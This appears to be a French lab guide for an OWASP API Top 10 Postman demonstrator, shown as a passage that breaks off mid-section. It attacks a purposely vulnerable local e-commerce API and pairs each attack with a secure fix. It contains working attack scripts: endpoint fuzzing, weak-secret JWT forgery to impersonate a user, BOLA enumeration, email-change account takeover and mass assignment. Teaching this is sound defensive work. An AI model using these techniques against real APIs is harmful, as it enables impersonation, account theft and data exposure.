# Guide du Démonstrateur Postman
## OWASP API Security Top 10 - Attaques et Défenses

---

## Table des matières

1. [Introduction](#introduction)
2. [Configuration initiale](#configuration-initiale)
3. [Rappel : Comprendre une requête HTTP](#rappel-comprendre-une-requête-http)
4. [PHASE 1 : Discovery & Identity](#phase-1--discovery--identity)
5. [PHASE 2 : Access to data (Objects & Properties)](#phase-2--access-to-data)
6. [PHASE 3 : Misuse of Business Logic and Privileges](#phase-3--business-logic--privileges)
7. [PHASE 4 : Infrastructure weaknesses and Availability](#phase-4--infrastructure-weaknesses-and-availability)
8. [Tester l'API sécurisée](#tester-lapi-sécurisée)

---

## Introduction

### Objectif pédagogique

Ce démonstrateur illustre concrètement les vulnérabilités du Top 10 OWASP API 2023 à travers un scénario réaliste d'attaque progressive contre une plateforme e-commerce.

### Le scénario

Vous incarnez **"Badguy"** (ID: 666), un vendeur malhonnête sur la plateforme.

**Votre parcours :**

1. **Blocage** : Votre produit est signalé par user1
2. **Reconnaissance** : Cartographie de l'API
3. **Compromission** : Usurpation d'identité
4. **Escalade** : Obtention de privilèges Admin
5. **Sabotage** : Déni de service généralisé

### Vulnérabilités exploitées

| Vulnérabilité | Description | Impact |
|---------------|-------------|---------|
| **API1 - BOLA** | Accès aux ressources d'autres utilisateurs | Fuite de données personnelles |
| **API2 - Broken Auth** | Authentification faible, JWT forgeable | Usurpation d'identité |
| **API3 - Mass Assignment** | Modification de champs non autorisés | Déblocage de produit, élévation de privilèges |
| **API4 - Resource Consumption** | Absence de limitation de ressources | Déni de service |
| **API5 - BFLA** | Accès aux fonctions administratives | Contrôle total du système |
| **API6 - Business Flows** | Automatisation de flux critiques | Scalping, épuisement de stock |
| **API8 - Misconfiguration** | CORS permissif, fuites d'informations | Exfiltration de données sensibles |
| **API9 - Asset Management** | Documentation publique, endpoints exposés | Cartographie complète de l'API |

---

## Configuration initiale

### Prérequis

- Postman installé (version desktop recommandée)
- Les deux APIs lancées en local :
  - API vulnérable : port 8000
  - API sécurisée : port 8001
- Collection Postman importée
- Environnement Postman configuré

### Étapes de configuration

#### 1. Importer la collection

Dans Postman :
```
File → Import → Sélectionner OWASP_Collection.json
```

#### 2. Configurer l'environnement

Dans Postman :
```
File → Import → Sélectionner OWASP_Env.json
```
- Sélectionner **"Owasp API Security - Env"** dans le menu déroulant en haut à droite
- Vérifier la variable `base_url` :
  - Pour l'API vulnérable : `http://localhost:8000`
  - Pour l'API sécurisée : `http://localhost:8001`

#### 3. Activer la Console

- Cliquer sur le bouton **"Console"** en bas à gauche de Postman
- La console affichera les résultats des scripts d'attaque automatisés

**Important :** Avant de commencer, assurez-vous que `base_url` pointe vers `http://localhost:8000` (API vulnérable).

---

## Rappel : Comprendre une requête HTTP

Avant de lancer les attaques, il est essentiel de comprendre comment Postman communique avec le serveur.

### 1. La Méthode HTTP (Le "Verbe")

| Méthode | Action | Exemple d'utilisation |
|---------|--------|----------------------|
| **GET** | Lire une donnée | Consulter un profil, lister des produits |
| **POST** | Créer ou envoyer | S'inscrire, se connecter, créer une commande |
| **PATCH** | Modifier partiellement | Changer un prix, mettre à jour une description |
| **DELETE** | Supprimer | Supprimer un utilisateur, retirer un produit |
| **OPTIONS** | Vérifier les méthodes autorisées | Requête CORS de pré-vérification |

### 2. L'Endpoint (L'URL)

C'est l'adresse précise de la ressource ciblée.

**Exemple :** `http://localhost:8000/users/1`
- `http://localhost:8000` : Adresse du serveur
- `/users/1` : Chemin vers l'utilisateur n°1

### 3. Les Headers (Les "En-têtes")

Métadonnées invisibles envoyées avec la requête :

- `Content-Type: application/json` : Indique que le corps de la requête est en JSON
- `Authorization: Bearer <token>` : Votre badge d'accès (token JWT)
- `X-Forwarded-For: <IP>` : IP d'origine (peut être falsifiée)

**Point d'attaque :** Le header `Authorization` est la cible principale des attaques. Sans lui, le serveur ne sait pas qui vous êtes. Avec un token falsifié, vous pouvez usurper n'importe quelle identité.

### 4. Le Body / Payload (Le "Corps")

Le contenu envoyé au serveur (principalement pour POST et PATCH)

```json
{
  "email": "attaquant@evil.com",
  "blocked": false
}
```

**Stratégie d'attaque :** L'attaquant modifie ce payload pour injecter des données malveillantes que le serveur n'attendait pas.

### 5. La Réponse (Codes de statut HTTP)

| Code | Signification | Interprétation pour l'attaquant |
|------|---------------|--------------------------------|
| **200 OK** | Succès | L'attaque a probablement fonctionné |
| **400 Bad Request** | Requête invalide | Données invalide pour raison métier (ex: mauvais CAPTCHA) |
| **401 Unauthorized** | Non authentifié | Token manquant ou invalide |
| **403 Forbidden** | Accès refusé | Authentifié mais pas les droits nécessaires |
| **404 Not Found** | Ressource inexistante | L'endpoint n'existe pas |
| **429 Too Many Requests** | Rate limit dépassé | Vous allez trop vite, protection activée |
| **422 Unprocessable Entity** | Requête invalide | Format des de données envoyé incorrect (champ manquant) |
| **405 Method Not Allowed** | Requête invalide | Endpoint ne possédant pas la méthode demandée (ex : PATCH au lieu de GET) |

---

## PHASE 1 : Discovery & Identity

**Objectif :** Cartographier l'API et identifier les portes d'entrée sans éveiller les soupçons.

### 01 - API9 : Improper Assets Management

#### Request 1.1 : Health Check

**Requête :**
```
GET {{base_url}}/health
```

**Objectif de l'attaquant :**
Vérifier que l'API est en ligne et collecter des informations sur l'infrastructure technique.

**Action dans Postman :**
1. Sélectionner la requête "Request 1.1 : Health Check"
2. Cliquer sur "Send"
3. Examiner la réponse JSON dans l'onglet "Body"

**Réponse attendue (API vulnérable) :**
```json
{
  "status": "ok",
  "service": "vulnerable-api",
  "version": "1.0.0-beta",
  "environment": "production-v1",
  "framework": "FastAPI 0.120.4",
  "system": "Linux",
  "language": "Python 3.10.12",
  "database_status": "connected (SQLite 3.39.2)"
}
```

**Analyse des fuites d'informations :**

- `"version": "1.0.0-beta"` : Version instable, probablement non testée entièrement
- `"framework": "FastAPI 0.120.4"` : L'attaquant peut chercher des CVE spécifiques à cette version
- `"database_status": "connected (SQLite 3.39.2)"` : Révèle le SGBD utilisé, utile pour cibler des injections SQL
- `"system": "Linux"` : Indique l'OS, crucial pour des attaques de type Path Traversal

**Impact :** Ces informations réduisent considérablement le temps de reconnaissance de l'attaquant et augmentent ses chances de succès.

**Mesure de sécurité dans l'API sécurisée :**

La réponse ne contient que le strict minimum :

```json
{
  "status": "ok",
  "service": "secure-shop-api"
}
```

**Principe appliqué :** Minimisation de l'exposition des informations techniques (Principle of Least Privilege pour les métadonnées).

---

#### Request 1.2 : Get OpenAPI Documentation

**Requête :**
```
GET {{base_url}}/openapi.json
```

**Objectif de l'attaquant :**
Récupérer la documentation complète de l'API avec tous les endpoints, paramètres et schémas de données.

**Action dans Postman :**
1. Sélectionner la requête "Request 1.2 : Get OpenAPI Documentation"
2. Cliquer sur "Send"
3. Examiner la réponse JSON
4. Ouvrir la Console Postman (en bas de la fenêtre Postman, il faut la glisser vers le haut)

**Ce qu'il faut observer :**

La réponse JSON contient l'intégralité de la structure de l'API. Regardez notamment :
- La section `"paths"` : liste tous les endpoints disponibles
- Les routes `/admin/*` : fonctionnalités sensibles
- Les schémas : structure exacte des objets (User, Product, Order)

**Script de test automatique :**

Ouvrez l'onglet "Tests" de cette requête dans Postman. Le script vérifie automatiquement la présence de routes admin :

```javascript
pm.test("Vulnerability confirmed : admin routes exposed", function() {
    const jsonData = pm.response.json();
    const paths = Object.keys(jsonData.paths);
    const adminRoutes = paths.filter(p => p.includes('/admin'));
    console.log("Sensitive admin routes discovered :", adminRoutes);
    pm.expect(adminRoutes.length).to.be.above(0);
});
```

**Résultat dans la Console :**
```
Sensitive admin routes discovered : [
  "/admin/users",
  "/admin/orders",
  "/admin/promote/{user_id}",
  "/admin/stats",
  "/admin/messages"
]
```

**Impact :** L'attaquant obtient une carte complète du système sans avoir à deviner les chemins. Il connaît maintenant tous les endpoints admin, leurs paramètres et leurs contraintes.

**Mesure de sécurité dans l'API sécurisée :**

La documentation OpenAPI est désactivée globalement :

```python
app = FastAPI(
    openapi_url=None,  # Désactive /openapi.json
    docs_url=None,     # Désactive /docs
    redoc_url=None     # Désactive /redoc
)
```

**Résultat :** La requête retourne une erreur 404. L'attaquant doit procéder en aveugle (Blind Fuzzing), ce qui est beaucoup plus lent et détectable.

---

#### Request 1.3 : Fuzzing - Test admin endpoints

**Requête :**
```
GET {{base_url}}/admin
```

**Objectif de l'attaquant :**
Tester systématiquement des chemins d'URL courants pour découvrir des endpoints cachés ou non documentés. En effet, en général la documentation de chaque endpoint n'est pas si facilement obtenue par un attaquant. Ceci est donc une autre manière de les découvrir.

**Fonctionnement du script :**

Cette requête utilise un script Post-Response qui teste automatiquement une liste d'endpoints potentiels.

**Action dans Postman :**
1. Sélectionner la requête "Request 1.3 : Fuzzing"
2. Ouvrir l'onglet "Tests" pour voir le code
3. Cliquer sur "Send"
4. Ouvrir la Console Postman pour voir les résultats

**Script d'attaque (visible dans l'onglet "Tests") :**

```javascript
const common_endpoints = [
    "/admin", 
    "/api/admin", 
    "/users/admin", 
    "/admin/users", 
    "/admin/orders", 
    "/dashboard", 
    "/control-panel",
    "/admin/dashboard",
    "/admin/promote",
    "/admin/stats",
    "/admin/messages"
];

const baseUrl = pm.environment.get("base_url");
console.log("Starting fuzzing : Testing " + common_endpoints.length + " potential endpoints");

common_endpoints.forEach(endpoint => {
    pm.sendRequest({
        url: baseUrl + endpoint,
        method: 'GET'
    }, (err, response) => {
        if (err) {
            console.log(`GET ${baseUrl}${endpoint} -> ERROR (${err})`);
        } else {
            console.log(`GET ${baseUrl}${endpoint} -> ${response.code} (${response.responseTime} ms)`);
        }
    });
});
```

**Résultats dans la Console Postman :**

```
Starting fuzzing : Testing 11 potential endpoints
GET http://localhost:8000/admin          -> 404 (19 ms)
GET http://localhost:8000/dashboard      -> 404 (30 ms)
GET http://localhost:8000/admin/messages -> 401 (28 ms)
GET http://localhost:8000/admin/users    -> 401 (52 ms)
GET http://localhost:8000/admin/orders   -> 401 (54 ms)
GET http://localhost:8000/admin/stats    -> 403 (41 ms)
POST http://localhost:8000/admin/promote/1 -> 401 (48 ms)
```

**Interprétation des codes de statut :**

| Code | Signification pour l'attaquant |
|------|-------------------------------|
| **404** | La route n'existe pas |
| **401** | La route existe mais nécessite un token. **Cible confirmée !** |
| **403** | La route existe mais est protégée par un pare-feu ou des permissions. **Ressource très sensible.** |

**Impact :** L'attaquant a confirmé l'existence de plusieurs endpoints administratifs critiques :
- `/admin/users`
- `/admin/orders`
- `/admin/promote`
- `/admin/stats`

**Mesures de sécurité dans l'API sécurisée :**

**1. Obscurcissement de l'URL :**

```python
SECRET_ADMIN_URL = "/management-7f8a9d1c-3b2e-4a1f"  # Depuis variable d'environnement

app.include_router(
    admin.router, 
    prefix=SECRET_ADMIN_URL,
    tags=["Admin"]
)
```

Les endpoints admin ne sont plus sous `/admin` mais sous un préfixe aléatoire et imprévisible.

**2. Défense en profondeur :**

Même si l'URL est découverte, l'accès reste verrouillé par authentification + vérification de rôle stricte.

**Note importante :** L'obscurcissement seul (security by obscurity) ne suffit jamais. Il doit être combiné avec des contrôles d'accès robustes.

---

### 02a - Weak Secret Attack (JWT Forgery)

**Objectif :** Usurper l'identité de user1 pour manipuler le signalement qu'elle a effectué contre le produit de l'attaquant.

#### Request 2a.1 : Login Attacker (Get Token)

**Requête :**
```
POST {{base_url}}/auth/login
```

**Objectif :**
L'attaquant se connecte légitimement avec son propre compte pour récupérer un token JWT et l'analyser.

**Action dans Postman :**
1. Sélectionner la requête "Request 2a.1 : Login Attacker"
2. Vérifier le corps de la requête dans l'onglet "Body"
3. Cliquer sur "Send"

**Corps de la requête (Body) :**
```json
{
  "username": "badguy",
  "password": "password666"
}
```

**Réponse attendue :**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiYWRndXkifQ.gD3_mujAa_myFjGPiayX31h_LKy-Vy99s7hU-vHWMAs",
  "token_type": "bearer",
  "user_id": 666,
  "role": "user"
}
```

**Script automatique :**

Un script Post-Response sauvegarde automatiquement le token dans les variables d'environnement. Ouvrez l'onglet "Tests" pour voir :

```javascript
const response = pm.response.json();
if (response.access_token) {
    pm.environment.set("attacker_token", response.access_token);
    console.log("Token saved:", response.access_token);
}
```

**Vérification :**
- Allez dans "Environments" → "Owasp API Security - Env"
- Vérifiez que la variable `attacker_token` contient bien le token

Vous pouvez maintenant utiliser `{{attacker_token}}` dans les requêtes suivantes.

---

#### Request 2a.2 : Decode Token (Manual)

**Action manuelle requise - Pas de requête Postman**

**Étapes détaillées :**

1. **Copier le token :**
   - Depuis la réponse de la requête précédente
   - Copiez la valeur de `access_token`

2. **Ouvrir jwt.io :**
   - Allez sur https://jwt.io dans votre navigateur

3. **Coller le token :**
   - Dans la zone "Encoded", collez le token complet

**Analyse du token :**

Un JWT est composé de 3 parties séparées par des points :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header (encodé en Base64)
.
eyJzdWIiOiJiYWRndXkifQ                  ← Payload (encodé en Base64)
.
gD3_mujAa_myFjGPiayX31h_LKy-Vy99s7hU... ← Signature (HMAC-SHA256)
```

**Header décodé :**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- `alg: HS256` : Algorithme HMAC avec SHA-256 (symétrique)
- `typ: JWT` : Type de token

**Payload décodé :**
```json
{
  "sub": "badguy"
}
```

- `sub` : Subject (nom d'utilisateur identifiant le porteur du token)

**Tentative de validation de la signature :**

Sur jwt.io, dans la section "VERIFY SIGNATURE", vous verrez initialement :
```
Signature Verification Failed
```

C'est normal : le site ne connaît pas le secret utilisé par le serveur pour signer le token.

**Attaque par dictionnaire :**

Dans le champ "your-256-bit-secret", testez des secrets faibles courants :

1. Tapez `secret` → Invalid Signature
2. Tapez `1234` → Invalid Signature
3. Tapez `signature` → Invalid Signature
4. Tapez `secret123` → **Signature verified** ✓

**Vulnérabilité critique identifiée :** Le secret cryptographique est `secret123`, un mot de passe trivial devinable en quelques secondes avec un outil d'attaque par dictionnaire.

**Implications :**

Avec ce secret, l'attaquant peut maintenant :
- Forger un token au nom de n'importe quel utilisateur en modifiant `"sub"`
- Usurper l'identité d'un administrateur en créant un token avec `"sub": "admin"`
- Le token n'expire jamais (absence de champ `exp`)

---

#### Request 2a.3 : Check report status

**Requête :**
```
GET {{base_url}}/products/666/reports
```

**Objectif :**
Consulter les signalements effectués sur le produit de l'attaquant (ID 666).

**Action dans Postman :**
1. Sélectionner la requête "Request 2a.3 : Check report status"
2. Cliquer sur "Send"

**Réponse :**
```json
[
  {
    "reporter": "user1",
    "reporter_id": 2,
    "reason": "WARNING: This product is a dangerous counterfeit. Do not purchase!",
    "timestamp": "2026-01-30T23:08:50.600575"
  }
]
```

**Informations collectées :**
- Nom d'utilisateur : `user1`
- ID technique : `2`
- Contenu du signalement : Très négatif, nuit à la réputation du produit

**Fuite d'information :** L'API expose l'ID interne de l'utilisateur, permettant à l'attaquant de cibler précisément ses prochaines actions.

---

#### Request 2a.4 : Forge and test user token

**Requête :**
```
POST {{base_url}}/products/666/reports
```

**Objectif :**
Forger un faux token au nom de user1 et l'utiliser pour modifier le signalement.

**Fonctionnement du script Pre-Request :**

Cette requête utilise un script qui s'exécute **AVANT** l'envoi de la requête.

**Action dans Postman :**
1. Sélectionner la requête "Request 2a.4 : Forge and test user token"
2. Ouvrir l'onglet "Pre-request Script" pour voir le code
3. Ouvrir la Console Postman
4. Cliquer sur "Send"

**Script de forgeage du token (visible dans "Pre-request Script") :**

```javascript
const CryptoJS = require('crypto-js');

// Forger le payload pour user1
const header = {
    "alg": "HS256",
    "typ": "JWT"
};

const payload = {
    "sub": "user1"  // Usurpation d'identité
};

const secret = "secret123";  // Secret découvert précédemment

// Encodage Base64Url
function base64url(source) {
    let encodedSource = CryptoJS.enc.Base64.stringify(source);
    encodedSource = encodedSource.replace(/=+$/, '');
    encodedSource = encodedSource.replace(/\+/g, '-');
    encodedSource = encodedSource.replace(/\//g, '_');
    return encodedSource;
}

const stringifiedHeader = CryptoJS.enc.Utf8.parse(JSON.stringify(header));
const encodedHeader = base64url(stringifiedHeader);

const stringifiedPayload = CryptoJS.enc.Utf8.parse(JSON.stringify(payload));
const encodedPayload = base64url(stringifiedPayload);

const token = encodedHeader + "." + encodedPayload;

// Signature HMAC-SHA256
const signature = CryptoJS.HmacSHA256(token, secret);
const encodedSignature = base64url(signature);

// Token forgé complet
const forgedToken = token + "." + encodedSignature;

pm.environment.set("forged_user1_token", forgedToken);
console.log("Forged token for user1:", forgedToken);
```

**Dans la Console, vous verrez :**
```
Forged token for user1: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.X7Y...
```
(peut-être pas exactement le même)

**Corps de la requête :**
```json
{
  "reason": "Sorry, that was my mistake. The product is authentic and excellent."
}
```

**Header Authorization :**

La requête utilise automatiquement le token forgé (vérifiez dans l'onglet "Auth") :
```
Authorization: Bearer {{forged_user1_token}}
```

**Réponse attendue :**
```json
{
  "reporter": "user1",
  "reason": "Sorry, that was my mistake. The product is authentic and excellent.",
  "timestamp": "2026-01-23T18:33:33.584682"
}
```

**Attaque réussie :** Le serveur a accepté le token forgé et a modifié le signalement au nom de user1. L'usurpation d'identité est complète.

---

#### Request 2a.5 : Check new report status

**Requête :**
```
GET {{base_url}}/products/666/reports
```

**Objectif :**
Confirmer que la modification a bien été enregistrée en base de données.

**Action dans Postman :**
1. Sélectionner la requête "Request 2a.5 : Check new report status"
2. Cliquer sur "Send"

**Réponse :**
```json
[
  {
    "reporter": "user1",
    "reporter_id": 2,
    "reason": "Sorry, that was my mistake. The product is authentic and excellent.",
    "timestamp": "2026-01-23T18:33:33.584682"
  }
]
```

Le signalement négatif a été remplacé par un message positif, redonnant de la crédibilité au produit frauduleux.

**Mesures de sécurité dans l'API sécurisée :**

**1. Secret cryptographique robuste :**
```python
SECRET_KEY = os.getenv("SECRET_KEY")  # Clé de 256 bits aléatoire
# Généré avec: openssl rand -hex 32
```

Le secret est stocké dans un fichier `.env` non versionné.

**2. Expiration des tokens :**
```python
ACCESS_TOKEN_EXPIRE_MINUTES = 30

def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt
```

**3. Invalidation côté serveur (Logout fonctionnel) :**
```python
@router.post("/logout")
def logout_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    add_token_to_blacklist(db, token)
    return {"message": "Logged out successfully (Token invalidated)"}
```

**4. Vérification de la blacklist :**
```python
def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    if is_token_blacklisted(db, token):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Token has been invalidated (logged out)"
        )
```

**Résultat :** Un token volé ou forgé expire après 30 minutes et peut être révoqué immédiatement.

---

### 02b - Account Takeover

**Objectif :** Empêcher user1 de rétablir la vérité en prenant définitivement le contrôle de son compte.

#### Request 2b.1 : Check if ID of user1 is correct

**Requête :**
```
GET {{base_url}}/users/2
```

**Objectif :**
Vérifier les informations de user1 avant l'attaque.

**Action dans Postman :**
1. Sélectionner la requête "Request 2b.1 : Check if ID of user1 is correct"
2. Vérifier que le Header "Authorization" contient `{{attacker_token}}`
3. Cliquer sur "Send"

**Réponse :**
```json
{
  "id": 2,
  "username": "user1",
  "email": "user1@example.com",
  "role": "user",
  "blocked": 0
}
```

**Vulnérabilité BOLA :** L'attaquant peut consulter le profil d'un autre utilisateur simplement en changeant l'ID dans l'URL. Aucune vérification de propriété n'est effectuée.

---

#### Request 2b.2 : Modify email without password

**Requête :**
```
PATCH {{base_url}}/users/2
```

**Objectif :**
Modifier l'adresse email de user1 sans avoir à fournir son mot de passe actuel.

**Action dans Postman :**
1. Sélectionner la requête "Request 2b.2 : Modify email without password"
2. Vérifier le corps de la requête
3. Vérifier le Header "Authorization" (utilise le token de l'attaquant)
4. Cliquer sur "Send"

**Corps de la requête :**
```json
{
  "email": "badguy2@free.fr"
}
```

**Header :** (dans l'onglet Auth)
```
Authorization: Bearer {{attacker_token}}
```

L'attaquant utilise son propre token légitime, pas celui de user1.

**Réponse :**
```json
{
  "id": 2,
  "username": "user1",
  "email": "badguy2@free.fr",
  "role": "user",
  "blocked": 0
}
```

**Vulnérabilité critique :** L'API permet de modifier l'email d'un autre utilisateur sans vérifier :
- Que l'utilisateur authentifié est bien le propriétaire du compte
- Le mot de passe actuel

Cette faille combine :
- **API1 (BOLA)** : Modification de ressource appartenant à autrui
- **API2 (Broken Authentication)** : Pas de vérification du mot de passe

---

#### Request 2b.3 : Reset password

**Requête :**
```
POST {{base_url}}/auth/forgot-password
```

**Objectif :**
Déclencher la procédure de réinitialisation de mot de passe. Le lien sera envoyé à l'adresse email de l'attaquant.

**Action dans Postman :**
1. Sélectionner la requête "Request 2b.3 : Reset password"
2. Vérifier le corps de la requête
3. Cliquer sur "Send"

**Corps de la requête :**
```json
{
  "username": "user1"
}
```

**Réponse :**
```json
{
  "message": "A reset email has been sent to badguy2@free.fr"
}
```

**Résultat :**
- L'attaquant reçoit le lien de réinitialisation
- L'attaquant définit un nouveau mot de passe
- L'attaquant prend le contrôle total du compte de user1

**Prise de contrôle complète :**
1. L'attaquant a modifié le signalement
2. L'attaquant a volé le compte de user1
3. user1 ne peut plus se connecter ni rétablir la vérité

**Mesures de sécurité dans l'API sécurisée :**


**1. Vérification du mot de passe pour changement d'email :**
```python
@router.patch("/users/me", response_model=UserResponse, tags=["Users"])
def update_user_me(
    user_update: UserUpdateSecure,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    if user_update.email is not None:
        if not user_update.current_password:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="To change your email address, you must confirm your current password.")
        if not verify_password(user_update.current_password, current_user.hashed_password):
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Incorrect password.")
    updated_user = update_user_secure(db, current_user, user_update)
    return updated_user
    # Modification autorisée...
```

---

## PHASE 2 : Access to data

**Objectif :** Voler des données sensibles et contourner les règles métier pour débloquer le produit frauduleux.

### 03 - API1 : Broken Object Level Authorization (BOLA)

#### Request 3.1 : Access own profile

**Requête :**
```
GET {{base_url}}/users/666
```

**Objectif :**
Comportement normal : l'attaquant accède à son propre profil.

**Action dans Postman :**
1. Sélectionner la requête "Request 3.1 : Access own profile"
2. Vérifier que le Header "Authorization" contient `{{attacker_token}}`
3. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

**Réponse :**
```json
{
  "id": 666,
  "username": "badguy",
  "email": "badguy@free.fr",
  "role": "user",
  "blocked": 0
}
```

Cette requête établit le comportement attendu : l'utilisateur peut consulter son propre profil.

---

#### Request 3.2 : Access other user profile

**Requête :**
```
GET {{base_url}}/users/3
```

**Objectif :**
Tester si l'API vérifie que l'utilisateur authentifié est autorisé à consulter cette ressource.

**Action dans Postman :**
1. Sélectionner la requête "Request 3.2 : Access other user profile"
2. Remarquez que l'ID dans l'URL a changé de `666` à `3`
3. Le Header "Authorization" utilise toujours `{{attacker_token}}`
4. Cliquer sur "Send"

**Réponse :**
```json
{
  "id": 3,
  "username": "user2",
  "email": "theodoreguillaume@example.com",
  "role": "user",
  "blocked": 0
}
```

**Vulnérabilité BOLA confirmée :** L'API vérifie que l'utilisateur est authentifié (token valide) mais ne vérifie pas s'il est autorisé à accéder à cette ressource spécifique.

**Impact :**
L'attaquant peut énumérer tous les utilisateurs (ID 1, 2, 3, ...) et collecter leurs données personnelles :
- Email pour phishing
- Identifiants pour ciblage
- Informations sur les rôles

---

#### Request 3.3 : Access other user orders

**Requête :**
```
GET {{base_url}}/orders/user/5
```

**Objectif :**
Accéder à l'historique des commandes d'un autre utilisateur.

**Action dans Postman :**
1. Sélectionner la requête "Request 3.3 : Access other user orders"
2. Cliquer sur "Send"

**Réponse (extrait) :**
```json
[
  {
    "id": 1,
    "buyer_id": 5,
    "product_id": 10,
    "quantity": 2,
    "created_at": "2026-01-30T22:08:50.638000",
    "product": {
      "id": 10,
      "name": "Camera",
      "price": 140.0,
      "description": "...",
      "blocked": false,
      "stock": 96
    }
  },
  {
    "id": 11,
    "buyer_id": 5,
    "product_id": 26,
    "quantity": 2,
    "created_at": "2026-01-30T22:08:50.638014",
    "product": {
      "id": 26,
      "name": "Barby Doll",
      "price": 162.0,
      "description": "...",
      "blocked": false,
      "stock": 92
    }
  }
]
```

**Impact :** L'attaquant peut analyser :
- Les habitudes d'achat de n'importe quel client
- Leurs centres d'intérêt
- Leur pouvoir d'achat
- Données revendables ou utilisables pour du phishing ciblé

**Mesures de sécurité dans l'API sécurisée :**

**1. Séparation des endpoints (architecture défensive) :**
```python
# Endpoint privé : consultation de son propre profil
@router.get("/users/me", response_model=UserResponse, tags=["Users"])
def read_user_me(current_user: User = Depends(get_current_user)):
    return current_user

# Endpoint public : consultation d'un profil vendeur (données filtrées)
@router.get("/users/{user_id}", response_model=UserPublic, tags=["Users"])
def read_user_by_id(user_id: int, db: Session = Depends(get_db)):
    user = get_user_by_id(db, user_id=user_id)
    if user is None:
        raise HTTPException(status_code=404, detail="User not found")
    return user
    # Retourne uniquement username, pas l'email
```

L'ID n'est plus exposé dans l'URL pour l'endpoint /me, qui renvoie des informations sensibles sur l'utilisateur qui est actuellement connecté. Son ID est extrait du token JWT. 
En modifiant l'URL pour accéder à un autre profil, on accède seulement aux informations publiques d'un vendeur, qui ne sont pas sensibles.

**2. Endpoint contextuel pour les commandes :**
```python
# Au lieu de GET /orders/user/{user_id}
@router.get("/orders/me")
def get_my_orders(
    current_user: User = Depends(get_current_user), 
    db: Session = Depends(get_db)
):
    orders = db.query(Order).filter(Order.buyer_id == current_user.id).all()
    return orders
```
Il n'y a pas d'endpoint pour les commandes avec l'ID dans l'URL : les utilisateurs n'ont pas besoin d'accéder à d'autres commandes que les leurs.

**3. Alternative : Vérification explicite (pour les cas où l'ID doit être dans l'URL) :**
```python
@router.get("/users/{user_id}")
def get_user_profile(
    user_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # Vérification stricte de l'autorisation
    if current_user.id != user_id and current_user.role != "admin":
        raise HTTPException(
            status_code=403,
            detail="Access denied: You can only view your own profile."
        )
    # Récupération autorisée...
```

**4. Utilisation de GUIDs (recommandation supplémentaire) :**

Pour les ressources où l'ID doit absolument être exposé, utiliser des UUID plutôt que des entiers séquentiels :

```python
id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
```

**Exemple :** `/orders/a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11` au lieu de `/orders/1`

**Avantage :** Impossible de deviner ou énumérer les IDs.

---

### 04 - API3 : Excessive Data Exposure & Mass Assignment

#### Request 4a.1 : Get product details (public)

**Requête :**
```
GET {{base_url}}/products/50
```

**Objectif :**
Consulter les détails d'un produit. Cet endpoint est public (pas d'authentification requise).

**Action dans Postman :**
1. Sélectionner la requête "Request 4a.1 : Get product details"
2. Notez qu'il n'y a pas de Header "Authorization" (endpoint public)
3. Cliquer sur "Send"

**Réponse :**
```json
{
  "id": 50,
  "name": "Air Fryer",
  "price": 44.0,
  "description": "Livrer puissance horizon perdre acte...",
  "blocked": false,
  "seller": {
    "id": 3,
    "username": "user2",
    "email": "klopes@example.com",
    "role": "user",
    "phone": "+33 1 88 68 29 00",
    "address": "8, rue Guillou\n33143 Boyer"
  },
  "stock": 96
}
```
Note : vous ne verrez sûrement pas les exactes mêmes informations que celles-ci, car la base de données les choisit de manière aléatoire.

**Excessive Data Exposure :** L'API renvoie l'objet `seller` complet avec des données personnelles sensibles :
- **Email** : risque de phishing
- **Téléphone** : risque d'harcèlement
- **Adresse postale complète** : risque de sécurité physique

**Impact :** L'attaquant peut collecter ces informations pour tous les vendeurs de la plateforme sans aucune authentification.

**Mesure de sécurité : Filtrage strict avec Pydantic**

```python
# Schéma de réponse restreint
class SellerResponseSecure(BaseModel):
    id: int
    username: str
    class Config:
        from_attributes = True

# Utilisation dans l'endpoint
@router.get("/products/{product_id}", response_model=ProductResponse)
def get_product(product_id: int, db: Session = Depends(get_db)):
    product = db.query(Product).filter(Product.id == product_id).first()
    # La réponse est automatiquement filtrée
    # Seuls id et username du vendeur sont renvoyés
    return product
```

**Résultat :** Email, téléphone et adresse sont automatiquement exclus de la réponse JSON.

---

#### Request 4b.1 : Check blocked product

**Requête :**
```
GET {{base_url}}/products/666
```

**Objectif :**
Vérifier l'état du produit de l'attaquant.

**Action dans Postman :**
1. Sélectionner la requête "Request 4b.1 : Check blocked product"
2. Cliquer sur "Send"

**Réponse :**
```json
{
  "id": 666,
  "name": "Cheap used iFone",
  "blocked": true,
  "seller": {...},
  "stock": 1
}
```

Le champ `"blocked": true` empêche la vente du produit. L'attaquant souhaite le passer à `false`.

---

#### Request 4b.2 : Unblock product (Mass Assignment)

**Requête :**
```
PATCH {{base_url}}/products/666
```

**Objectif :**
Tenter de débloquer le produit en injectant le champ `blocked` dans la requête de modification.

**Action dans Postman :**
1. Sélectionner la requête "Request 4b.2 : Unblock product"
2. Examiner le corps de la requête dans l'onglet "Body"
3. Vérifier le Header "Authorization"
4. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

**Corps de la requête :**
```json
{
  "description": "New product compliant with regulations",
  "blocked": false
}
```

**Analyse de l'attaque :**

L'attaquant envoie deux modifications :
- `description` : Champ légitime qu'un vendeur peut modifier
- `blocked` : Champ administratif qu'il ne devrait PAS pouvoir modifier

